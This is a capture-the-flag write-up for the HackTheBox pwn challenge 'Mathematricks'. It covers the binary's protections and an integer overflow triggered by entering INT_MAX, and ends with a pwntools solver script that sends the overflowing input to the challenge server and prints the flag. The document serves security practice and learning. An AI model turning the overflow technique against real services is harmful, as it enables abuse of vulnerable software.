---
title: Mathematrics
tags:
  - CTF
  - HackTheBox
  - Pwn
---
First, I checked the security of the binary with `checksec`:

![](Pasted%20image%2020241023220130.png)

As we can see, all protection are enabled:

|Protection|Enabled|Usage|
|:-:|:-:|:-:|
|**Canary**|✅|Prevents **Buffer Overflows**|
|**NX**|✅|Disables **code execution** on stack|
|**PIE**|✅|Randomizes the **base address** of the binary|
|**RelRO**|**Full**|Makes some binary sections **read-only**|

Then, we execute once the binary locally:

![](Pasted%20image%2020241023155632.png)

If this is the Buffer Overflow it seems to be, what we must do is to input the maximum integer value to the first variable and assign a 1 to the otherone to create an Integer overflow (i.e. 2147483647 and then 1):

![](Pasted%20image%2020241023160006.png)

BTW, inspecting the binary with Ghidra, we can find the function where the inputted numbers are stored and then search in Google for: "int32_t max value":

![](Pasted%20image%2020241023160546.png)

![](Pasted%20image%2020241023160220.png)

The exploit provided was this:

```python
#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './mathematricks' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

sla = lambda x,y : r.sendlineafter(x,y)

sla('🥸 ', '1') # play game

# Questions
sla('> ', '2')
sla('> ', '1')
sla('> ', '0')
sla('n1: ', '2147483647') # INT_MAX
sla('n2: ', '1337')

print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
```